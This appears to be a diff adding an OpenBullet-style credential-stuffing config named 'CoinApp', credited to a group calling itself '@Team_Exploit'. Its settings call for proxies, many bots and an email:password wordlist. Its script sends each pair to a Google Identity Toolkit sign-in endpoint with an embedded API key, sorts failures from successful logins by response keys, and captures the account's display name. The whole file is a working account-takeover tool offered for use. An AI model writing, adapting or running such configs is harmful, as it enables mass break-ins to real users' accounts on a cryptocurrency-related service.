@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "CoinApp",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-10T21:20:23.1209599-08:00",
+  "AdditionalInfo": "@Team_Exploit",
+  "Author": "@esfelurm",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyCCtXYmkLd3gh6fKjSCGOWhsYoeKccYq-g" 
+  CONTENT "{\"returnSecureToken\":true,\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "EMAIL_NOT_FOUND" 
+    KEY "INVALID_PASSWORD" 
+    KEY "MISSING_PASSWORD" 
+    KEY "INVALID_EMAIL" 
+  KEYCHAIN Success OR 
+    KEY "idToken" 
+    KEY "displayName" 
+    KEY "localId" 
+
+#displayName PARSE "<SOURCE>" JSON "displayName" CreateEmpty=FALSE -> CAP "DisplayName" 
+
